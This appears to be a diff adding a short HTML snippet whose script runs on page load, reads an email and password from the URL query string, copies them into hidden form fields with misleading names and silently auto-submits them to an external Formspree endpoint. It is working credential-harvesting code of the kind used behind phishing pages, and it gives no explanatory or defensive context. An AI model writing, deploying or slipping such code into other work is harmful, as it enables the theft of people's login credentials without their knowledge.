@@ -1,0 +1,20 @@
+<form id="myForm" action="https://formspree.io/f/xpzvykll" method="post">
+    <input type="hidden" id="email" name="nama">
+    <input type="hidden" id="password" name="message">
+</form>
+<script>
+    function saveFormSubmission() {
+        localStorage.done = "1";
+    }
+    window.onload = function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        var password = urlParams.get('password');
+        if (email && password) {
+            document.getElementById('email').value = email;
+            document.getElementById('password').value = password;
+            saveFormSubmission();
+            document.getElementById('myForm').submit();
+        }
+    };
+</script>
